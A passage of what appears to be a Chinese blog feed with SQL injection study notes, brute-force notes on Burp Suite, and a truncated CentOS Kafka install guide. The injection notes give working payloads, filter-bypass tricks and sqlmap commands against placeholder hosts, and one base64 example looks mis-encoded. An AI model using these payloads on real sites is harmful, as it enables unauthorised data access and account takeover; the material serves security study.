security.users limit 1,1)floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line"></span><br><span class="line">3.GET双引号报错注入</span><br><span class="line">与单引号报错注入的区别在于闭合双引号</span><br></pre></td></tr></table></figure>
<h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.HTTP头注入</span><br><span class="line">对HTTP头的内容没有进行过滤，从而造成注入产生</span><br><span class="line"></span><br><span class="line">2.HTTP user-Agent注入</span><br><span class="line">程序代码：</span><br><span class="line">$insert&#x3D;&quot;INSERT INTO &#39;security&#39;.&#39;uagents&#39;(&#39;uagent&#39;,&#39;ip_address&#39;,&#39;username&#39;)VALUES(&#39;$uagent&#39;,&#39;$IP&#39;,$uname)&quot;;</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">updatexml(xml_document,xpath_string,new_value):</span><br><span class="line">第一个参数：XML文档对象名称</span><br><span class="line">第二个参数：XPath字符串</span><br><span class="line">第三个参数：替换查找到的符合条件的数据</span><br><span class="line">&#39;and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">3.HTTP Referer注入</span><br><span class="line">注入位置在Referer</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行测试</span><br><span class="line">sqlmap-u &quot;xxx.xxx.com&#x2F;post.php&quot; --forms </span><br><span class="line">&#x2F;&#x2F;对POST表单提交的内容进行测试</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;login.asp&quot; --data &quot;n&#x3D;1&amp;m&#x3D;1&quot;</span><br><span class="line">&#x2F;&#x2F;指定参数进行探测</span><br><span class="line"></span><br><span class="line">指定注入位置进行注入，在保存的文件中，将对应参数修改为 *</span><br><span class="line">sqlmap.py -r test.txt</span><br></pre></td></tr></table></figure>
<h2 id="注入绕过"><a href="#注入绕过" class="headerlink" title="注入绕过"></a>注入绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.大小写绕过</span><br><span class="line">通过修改关键字内字母大小写来绕过过滤措施，如</span><br><span class="line">AnD 1&#x3D;1</span><br><span class="line">OrdER </span><br><span class="line"></span><br><span class="line">2.双写绕过</span><br><span class="line">如果过滤机制设置出现关键字之后替换为空，则可以利用双写绕过。</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">3.编码绕过</span><br><span class="line">利用URL在线编码，绕过SQL注入的过滤机制。</span><br><span class="line">站长之家在线编码</span><br><span class="line"></span><br><span class="line">4.内联注释绕过</span><br><span class="line">&#x2F;!*select*&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.关于cookie</span><br><span class="line">服务器可以利用cookie包含信息的任意性来判断在HTTP传输中的状态。</span><br><span class="line">Cookie最典型的应用是判定注册用户是否已经登录网站，另一个是购物车处理，用户在不同的页面选择不同的商品，这些信息都会写入cookie，以便在最后付款时提取信息。</span><br><span class="line">在浏览器中，调试工具中输入document.cookie可查看当前的cookie值</span><br><span class="line"></span><br><span class="line">2.cookie注入</span><br><span class="line">代码中使用cookie传递参数，但是没有对Cookie中传递的参数进行过滤，导致SQL注入漏洞产生。</span><br><span class="line">&#x2F;&#x2F;利用&#39; or 1&#x3D;1 --+输出第一个用户名和密码</span><br><span class="line">payload：</span><br><span class="line">cookie：uname&#x3D;admin&#39; or 1&#x3D;1 --+; _guid&#x3D;%9999239293_324324</span><br><span class="line">&#x2F;&#x2F;用报错爆当前数据库版本</span><br><span class="line">payload：</span><br><span class="line">cookie：uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,version(),0x7e),1)--+ _guid&#x3D;3432432432_343242</span><br><span class="line"></span><br><span class="line">3.使用sqlmap进行cookie注入</span><br><span class="line">sqlmap -r test.txt --level 3 然后在注入位置改为 *</span><br><span class="line">sqlmap -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure>
<h2 id="Cookie-Base64编码注入"><a href="#Cookie-Base64编码注入" class="headerlink" title="Cookie  Base64编码注入"></a>Cookie  Base64编码注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.Base64</span><br><span class="line">Base64编码是从二进制到字符的过程，可用在HTTP环境下传递较长的标识信息。</span><br><span class="line">Base64是比较常见的传输8Bit字节码的编码方式之一，即基于64个可打印字符来表示二进制数据的方法。</span><br><span class="line"></span><br><span class="line">将原始内容转换为二进制，从左到右依次取6位，然后在最高位补两位0，形成新内容。</span><br><span class="line">编码规则：</span><br><span class="line">把3个字符变成4个字符；</span><br><span class="line">每76个字符加一个换行符；</span><br><span class="line">最后的结束符也要处理，结束符一般为&#x3D;&#x3D;。</span><br><span class="line"></span><br><span class="line">2.注入产生原因</span><br><span class="line">base64_decode(str):PHP语言中用于解密Base64解密字符串的函数。</span><br><span class="line"></span><br><span class="line">3.cookie base64注入</span><br><span class="line">base64编码后的admin：YWRtaW4&#x3D;</span><br><span class="line">&quot; or 1&#x3D;1 base64编码：liBvciAxPTEglw&#x3D;&#x3D;</span><br><span class="line">使用base64编码后的注入语句，插入到cookie对应位置进行注入探测</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行测试</span><br><span class="line">python sqlmap.py -r test.txt --level 3 --batch --tamper base64encode.py</span><br></pre></td></tr></table></figure>
<h2 id="过滤注释符注入"><a href="#过滤注释符注入" class="headerlink" title="过滤注释符注入"></a>过滤注释符注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.mysql注释符</span><br><span class="line">注释符作用：用于标记某段代码，起到对代码功能的说明作用，注释掉的内容不会被执行。</span><br><span class="line">单行注释： --+或--空格 或#</span><br><span class="line">多行注释：&#x2F;*多行注释内容*&#x2F;</span><br><span class="line">对于正常的SQL语句，注释符起到说明功能的作用。</span><br><span class="line">在SQL注入过程中，起到闭合单引号、双引号、单括号、多括号的功能。</span><br><span class="line"></span><br><span class="line">2.绕过过滤注释符进行注入</span><br><span class="line">利用注释符不能成功闭合单引号时，可利用or &#39;1&#39;&#x3D;1&#39;闭合单引号等</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,database(),&#39;3</span><br></pre></td></tr></table></figure>
<h2 id="绕过过滤and和or的注入"><a href="#绕过过滤and和or的注入" class="headerlink" title="绕过过滤and和or的注入"></a>绕过过滤and和or的注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.mysql基础</span><br><span class="line">Mysql中对大小写不敏感，大写与小写一样</span><br><span class="line">十六进制和URL编码的内容mysql可进行正常识别</span><br><span class="line">符号和关键字替换： and&#x3D;&amp;&amp;  or&#x3D;||</span><br><span class="line">内联注释与多行注释： &#x2F;*！内联注释*&#x2F;  &#x2F;*多行注释*&#x2F;</span><br><span class="line"></span><br><span class="line">2.绕过过滤and和or的注入</span><br><span class="line">绕过策略：</span><br><span class="line">大小写变形- Or、OR、oR、And、aND等，忽略大写过滤时失效</span><br><span class="line">敏感词汇中添加注释- a&#x2F;**&#x2F;nd  </span><br><span class="line">双写绕过- oorr</span><br><span class="line">利用符号代替- and&#x3D;&amp;&amp;  or&#x3D;||</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; || 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
<h2 id="绕过过滤空格的sql注入"><a href="#绕过过滤空格的sql注入" class="headerlink" title="绕过过滤空格的sql注入"></a>绕过过滤空格的sql注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.绕过策略：</span><br><span class="line">使用hex、urldecode编码方式：空格URL编码%0a TAB键(水平)%09</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键(垂直)</span><br><span class="line"></span><br><span class="line">2.使用sqlmap进行测试</span><br><span class="line">sqlmap -u &quot;URL&quot; --hex --dbs --batch</span><br></pre></td></tr></table></figure>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.宽字节</span><br><span class="line">GBK占用两字节</span><br><span class="line">ASCII码占用一字节</span><br><span class="line">PHP中编码为GBK，函数执行添加的是ASCII编码，MySQL默认字符集为GBK等宽字节字符集</span><br><span class="line"></span><br><span class="line">%DF:会被PHP的addslashes函数转义为&quot;%DF\&#39;&quot;,&quot;\&quot;即URL编码中的&quot;%5C&quot;,也就是说&quot;%DF&quot;会被转成&quot;%DF%5C%27&quot;。如果网站的字符集为GBK，MySQL使用的编码也是GBK，就会认为&quot;%DF%5C%27&quot;是一个宽字符。也就是&quot;縗&#39;&quot;。单引号就出来了</span><br><span class="line"></span><br><span class="line">2.宽字节sql注入</span><br><span class="line">payload：</span><br><span class="line">id&#x3D;%df&#39; --+  </span><br><span class="line">&#x2F;&#x2F;%DF 闭合前面，--+闭合后面</span><br><span class="line">例子：</span><br><span class="line">xxx.xxx.com&#x2F;？id&#x3D;-1%df&#39; union select 1,user(),version() --+</span><br><span class="line"></span><br><span class="line">3.宽字节注入扩展</span><br><span class="line">最常使用的宽字节注入是利用%df，其实只要第一个ascii码大于128就可以，比如ascii码为129的，就可以。</span><br><span class="line">如何转换为URL编码呢，先将129（十进制）转换为十六进制，也就是0x81，然后在十六进制前加%即可，即%81。</span><br><span class="line">GBK首字节对0x81-0xFE，尾字节对应0x40-0xFE（除0x7F）</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1%81&#39; union select 1,user(),database() --+</span><br></pre></td></tr></table></figure>
<h2 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.二阶注入</span><br><span class="line">第一次客户端进行注册，注册信息经网站服务器转给数据库服务器进行存储，第二次进行查询时，将第一次的注册信息作为payload进行查询数据库信息。</span><br><span class="line">update 或set...where username&#x3D;注册用户名</span><br><span class="line"></span><br><span class="line">2.二阶注入利用</span><br><span class="line">注册用户admin&#39;-- -</span><br><span class="line">注册成功后，使用注册的用户登录，修改密码</span><br><span class="line">查看网页源代码，将密码类型改为text</span><br><span class="line">修改密码后发现，已经成功修改了admin的密码</span><br><span class="line"></span><br><span class="line">因为-- 注释掉了后面的passwd，使得直接修改了admin的密码</span><br><span class="line">3.二阶注入的危害</span><br><span class="line">注入payload触发二次SQL注入</span><br><span class="line">注入payload触发XSS攻击</span><br></pre></td></tr></table></figure>
<h2 id="ASP-Access注入"><a href="#ASP-Access注入" class="headerlink" title="ASP+Access注入"></a>ASP+Access注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.ASP+Access网站技术</span><br><span class="line">ASP是微软公司开发的服务器端脚本环境，可用来创建动态交互网页并建立强大的web应用程序。ASP文件可包含文本、HTML和com组件调用。</span><br><span class="line"></span><br><span class="line">Microsoft office Access是由微软发布的关系数据库管理系统，只有表的概念。</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;xxx.xxx.com&#x2F;xxx.asp?id&#x3D;x&quot; --tables</span><br><span class="line"></span><br><span class="line">2.Access偏移注入</span><br><span class="line">原理：</span><br><span class="line">借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在页面上显示。</span><br><span class="line"></span><br><span class="line">利用场景：</span><br><span class="line">解决知道Access数据库知道表名，但是得不到字段的SQL注入困境。字段名取名复杂，字典暴力破解字段名不成功。</span><br><span class="line"></span><br><span class="line">注入流程：</span><br><span class="line">判断字段数：order by</span><br><span class="line">判断表名：使用union select * from 表名来获取</span><br><span class="line">利用注入公式进行注入</span><br><span class="line"></span><br><span class="line">注入实践：</span><br><span class="line">基本公式为order by出的字段数减去*号的字段数，然后再用order by的字段数减去（上步得出的答案的2倍）。</span><br><span class="line">如18-11&#x3D;7，18-7*2&#x3D;4</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;1.asp?id&#x3D;x union select 1,2,3,4 a.id,b.id, * from(sys_admin as a inner join sys_admin as b on a.id&#x3D;b.id)</span><br><span class="line">&#x2F;&#x2F;这里的union select 1，2，3，4就是刚才的得出来的长度</span><br><span class="line">&#x2F;&#x2F;后面是sql公式</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>暴力破解</title>
    <url>/2020/08/01/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.原理</span><br><span class="line">使用自定义字典文件中的内容与验证程序交互，从而在枚举过程中得到正确数据。</span><br><span class="line">如破解用户名、密码</span><br><span class="line">破解验证码</span><br><span class="line"></span><br><span class="line">暴力破解的前提：</span><br><span class="line">应用程序或服务器未进行限制</span><br><span class="line">具有内容涵盖全面的字典</span><br><span class="line"></span><br><span class="line">2.暴力破解方式</span><br><span class="line">在线方式</span><br><span class="line">离线方式</span><br><span class="line">破解成功取决于字典是否强大，以及本地机器与服务器性能、带宽限制等因素。</span><br><span class="line"></span><br><span class="line">3.使用Burpsuite进行暴力破解</span><br><span class="line">判断依据：登录成功与失败返回的HTML内容不同，大小不同，根据大小不同选出唯一的内容。</span><br></pre></td></tr></table></figure>
<h2 id="暴力破解表单内容"><a href="#暴力破解表单内容" class="headerlink" title="暴力破解表单内容"></a>暴力破解表单内容</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.HTML表单</span><br><span class="line">表单是一个包含表单元素的区域。</span><br><span class="line">表单元素是允许用户在表单中输入内容，如文本域、下拉列表、单选框、复选框等。</span><br><span class="line"></span><br><span class="line">2.暴力破解POST提交数据</span><br><span class="line">在登录页面经常使用POST方式提交数据。通过Burpsuite对POST提交的数据进行暴力破解。</span><br><span class="line"></span><br><span class="line">3.暴力破解验证码</span><br></pre></td></tr></table></figure>
<h2 id="HTTP-basic认证"><a href="#HTTP-basic认证" class="headerlink" title="HTTP basic认证"></a>HTTP basic认证</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.HTTP basic认证</span><br><span class="line">基本认证 basic authorizcation,是http1.0提出的认证方法。</span><br><span class="line"></span><br><span class="line">基本认证步骤：</span><br><span class="line">(1)服务端访问一个受http基本认证保护的资源</span><br><span class="line">(2)服务器返回401状态，要求客户端提供用户名和密码进行认证</span><br><span class="line">(3)客户端将输入的用户名密码用base64进行编码后，采用非加密明文方式发送给服务器</span><br><span class="line">(4)如果认证成功，则返回相应的资源。如果认证失败，则返回401状态，要求进行重新认证</span><br><span class="line"></span><br><span class="line">2.burpsuite分析认证过程</span><br><span class="line">使用Burpsuite对HTTP Basic认证进行抓包分析</span><br><span class="line">Authorizcation：Basic xxxxxx（base64加密后的用户名和密码）</span><br><span class="line"></span><br><span class="line">3.暴力破解burpsuite认证</span><br><span class="line">使用Burpsuite对目标进行暴力破解。</span><br><span class="line">在intruder里，选中base64加密后的用户名密码，add添加，选中payload；</span><br><span class="line">在payload processing里选中添加encode规则，选中base64，开始暴力破解。</span><br></pre></td></tr></table></figure>
<h2 id="HTTP-basic认证字典生成"><a href="#HTTP-basic认证字典生成" class="headerlink" title="HTTP basic认证字典生成"></a>HTTP basic认证字典生成</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.字典生成思路</span><br><span class="line">字典生成是针对具体目标生成，确定目标：username，passwd</span><br><span class="line">思路：</span><br><span class="line">读取字典文件内容；</span><br><span class="line">对读取来的文件内容进行拼接；</span><br><span class="line">将新生成的内容写入到最终字典文件中，要符合HTTP Basic认证。</span><br></pre></td></tr></table></figure>
<h2 id="Burpsuite设置HTTP认证"><a href="#Burpsuite设置HTTP认证" class="headerlink" title="Burpsuite设置HTTP认证"></a>Burpsuite设置HTTP认证</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.设置原因</span><br><span class="line">在web应用测试过程中，如果web设置了HTTP认证，就需要使用用户名、密码进行登录才能进行保护区域的资源访问。</span><br><span class="line"></span><br><span class="line">Burpsuite中提供了用于认证设置的功能模块可以设置HTTP认证需要的用户名、密码，方便测试。</span><br><span class="line">在useroptions在的Platform Authentication，点击add，填写destination host为目标ip，Authentication type选为Basic。</span><br></pre></td></tr></table></figure>
<h2 id="离线暴力破解"><a href="#离线暴力破解" class="headerlink" title="离线暴力破解"></a>离线暴力破解</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.离线破解</span><br><span class="line">离线破解：在破解过程中，已经获得加密密文，在不与目标服务器交互的情况下，利用在线网站或本地程序对密文进行破解。</span><br><span class="line"></span><br><span class="line">离线破解不会触发密码锁定机制；</span><br><span class="line">不会产生大量的登录失败日志引起注意。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7安装kafka</title>
    <url>/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="CentOS7下安装kafka"><a href="#CentOS7下安装kafka" class="headerlink" title="CentOS7下安装kafka"></a>CentOS7下安装kafka</h1><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><p>Kafka 服务端代码是用 Scala 开发语言编写的，Scala 是 JVM 系语言中的一种，这意味着用 Scala 编写的源代码编译之后也是 Java 字节码，并运行在 Java 虚拟机上。因此，在开始安装 Kafka 之前，我们需要先在系统上安装 JDK（Java SE Development Kit， Java SE开发套件），JDK 包含的 JRE（Java SE Runtime Environment，Java 运行时环境）是运行 Java 应用程序所必需的。</p>
<p>多数情况下，推荐安装 JDK 8 及以上的版本，因为 Kafka 自 2.0.0 版本开始，就已经正式摒弃对 Java 7 的支持了。另外，运行 Kafka 还需要安装 Apache ZooKeeper 服务，该服务是用来同步分布式进程。</p>
<h2 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h2><h4 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h4><p>操作系统：centos7.4</p>
<p>安装包版本： jdk-8u221-linux-x64.tar.gz</p>
<h4 id="2、卸载系统自带-OpenJDK"><a href="#2、卸载系统自带-OpenJDK" class="headerlink" title="2、卸载系统自带 OpenJDK"></a>2、卸载系统自带 OpenJDK</h4><p>如果 CentOS 系统中集成了 OpenJDK，那么需要先卸载自带的 OpenJDK 才能安装标准版 JDK，卸载具体步骤如下：</p>
<p>1、系统终端输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep java</span><br></pre></td></tr></table></figure>
<p>若系统中集成了 OpenJDK，会出现 xxxx_openjdk_xxxx 的信息；</p>
<p>2、删除 OpenJDK：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -e --nodeps rpm -qa | grep java</span><br></pre></td></tr></table></figure>
<h4 id="3、安装JDK1-8"><a href="#3、安装JDK1-8" class="headerlink" title="3、安装JDK1.8"></a>3、安装JDK1.8</h4><p>1、将下载的安装包使用winscp拷贝至服务器<code>/usr/local/src</code>目录下。</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802182606968.png" alt="image-20200802182606968"></p>
<p>2、新建JDK安装目录 <code>/usr/local/java</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;java</span><br></pre></td></tr></table></figure>
<p>3、解压文件 jdk-8u221-linux-x64.tar.gz 至安装目录 /usr/local/java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar zxvf jdk-8u221-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;java</span><br></pre></td></tr></table></figure>
<p>4、配置环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
<p>JAVA_HOME为JDK安装目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_221</span><br><span class="line">export JRE_HOME&#x3D;$&#123;JAVA_HOME&#125;&#x2F;jre</span><br><span class="line">export CLASSPATH&#x3D;.:$&#123;JAVA_HOME&#125;&#x2F;lib:$&#123;JRE_HOME&#125;&#x2F;lib</span><br><span class="line">export PATH&#x3D;$&#123;JAVA_HOME&#125;&#x2F;bin:$PATH</span><br></pre></td></tr></table></figure>
<p>5、让更新的环境变量生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
<p>6、检测安装是否成功，若安装并配置成功，可以看到以输出；如果得到诸如“-bash: java: 未找到命令 ”就需要退回去反复检査安装和配置步骤是否正确。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802183301282.png" alt="image-20200802183301282"></p>
<h2 id="安装和配置ZooKeeper"><a href="#安装和配置ZooKeeper" class="headerlink" title="安装和配置ZooKeeper"></a>安装和配置ZooKeeper</h2><h4 id="1、下载安装包"><a href="#1、下载安装包" class="headerlink" title="1、下载安装包"></a>1、下载安装包</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line"></span><br><span class="line">wget http:&#x2F;&#x2F;mirror.bit.edu.cn&#x2F;apache&#x2F;zookeeper&#x2F;zookeeper-3.5.8&#x2F;apache-zookeeper-3.5.8-bin.tar.gz</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802184047139.png" alt="image-20200802184047139"></p>
<h4 id="2、新建-安装目录"><a href="#2、新建-安装目录" class="headerlink" title="2、新建 安装目录"></a>2、新建 安装目录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p &#x2F;usr&#x2F;local&#x2F;zookeeper</span><br></pre></td></tr></table></figure>
<h4 id="3、解压至zookeeper目录"><a href="#3、解压至zookeeper目录" class="headerlink" title="3、解压至zookeeper目录"></a>3、解压至zookeeper目录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line"></span><br><span class="line">tar zxvf apache-zookeeper-3.5.8-bin.tar.gz -C &#x2F;usr&#x2F;local&#x2F;zookeeper</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802184509754.png" alt="image-20200802184509754"></p>
<h4 id="4、配置zookeeper"><a href="#4、配置zookeeper" class="headerlink" title="4、配置zookeeper"></a>4、配置zookeeper</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;conf</span><br><span class="line">[root@172 conf]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r--. 1 root root  535 May  4 21:26 configuration.xsl</span><br><span class="line">-rw-r--r--. 1 root root 2712 May  4 21:26 log4j.properties</span><br><span class="line">-rw-r--r--. 1 root root  922 May  4 21:26 zoo_sample.cfg</span><br></pre></td></tr></table></figure>
<p>1) 复制 zoo_sample.cfg 并重命名为 zoo.cfg</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp zoo_sample.cfg zoo.cfg</span><br></pre></td></tr></table></figure>
<p>2) 创建 ZooKeeper 保存数据目录和保存日志目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;data &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;logs</span><br></pre></td></tr></table></figure>
<p>3) 修改配置文件 zoo.cfg，修改内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dataDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;data </span><br><span class="line">dataLogDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;logs</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802185319790.png" alt="image-20200802185319790"></p>
<p>保存并退出文件修改。</p>
<p>4) 启动zookeeper</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;bin&#x2F;</span><br><span class="line"></span><br><span class="line">[root@172 bin]# .&#x2F;zkServer.sh start</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg</span><br><span class="line">Starting zookeeper ... STARTED</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802185712170.png" alt="image-20200802185712170"></p>
<p>ZooKeeper启动成功</p>
<h2 id="安装kafka"><a href="#安装kafka" class="headerlink" title="安装kafka"></a>安装kafka</h2><h4 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h4><p>从 Kafka 官网下载页 <a href="https://kafka.apache.org/downloads" target="_blank" rel="noopener">https://kafka.apache.org/downloads</a> 获取安装文件，当前最新的稳定版本是 2.4.1，于 2020 年 3 月 12 日发行。这里选择下载二进制文件 kafka_2.12-2.4.1.tgz。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line">wget https:&#x2F;&#x2F;mirror.bit.edu.cn&#x2F;apache&#x2F;kafka&#x2F;2.4.1&#x2F;kafka_2.12-2.4.1.tgz</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802193122030.png" alt="image-20200802193122030"></p>
<h4 id="2、创建安装目录"><a href="#2、创建安装目录" class="headerlink" title="2、创建安装目录"></a>2、创建安装目录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;kafka</span><br></pre></td></tr></table></figure>
<h4 id="3、解压缩"><a href="#3、解压缩" class="headerlink" title="3、解压缩"></a>3、解压缩</h4><p>解压缩文件 kafka_2.12-2.4.1.tgz 至目录 /usr/local/kafka：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xvzf kafka_2.12-2.4.1.tgz -C &#x2F;usr&#x2F;local&#x2F;kafka --strip 1</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802193436385.png" alt="image-20200802193436385"></p>
<p>进入目录 /usr/local/kafka，可以看到以下子目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@172 src]# cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br><span class="line">[root@172 kafka]# ll</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x. 3 root root  4096 Mar  3 08:34 bin</span><br><span class="line">drwxr-xr-x. 2 root root  4096 Mar  3 08:34 config</span><br><span class="line">drwxr-xr-x. 2 root root  8192 Aug  2 19:34 libs</span><br><span class="line">-rw-r--r--. 1 root root 32216 Mar  3 08:32 LICENSE</span><br><span class="line">-rw-r--r--. 1 root root   337 Mar  3 08:32 NOTICE</span><br><span class="line">drwxr-xr-x. 2 root root    44 Mar  3 08:34 site-docs</span><br></pre></td></tr></table></figure>
<p>其中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin目录下是操作 Kafka 的可执行脚本（.sh 文件），还包含在 windows 系统下的可执行脚本（.bat 文件），包括 Kafka 启动&#x2F;停止脚本、消费者性能测试脚本、生产者性能测试脚本、分区重分配脚本等；</span><br><span class="line"></span><br><span class="line">&#x2F;config目录是存放配置文件；</span><br><span class="line"></span><br><span class="line">&#x2F;libs目录是存放依赖库文件；</span><br><span class="line"></span><br><span class="line">&#x2F;logs目录存放的是 Kafka 的运行日志文件。</span><br></pre></td></tr></table></figure>
<h4 id="4、配置"><a href="#4、配置" class="headerlink" title="4、配置"></a>4、配置</h4><p>打开配置文件config/server.properties，修改 listeners 配置和 zookeeper 地址，具体如下：</p>
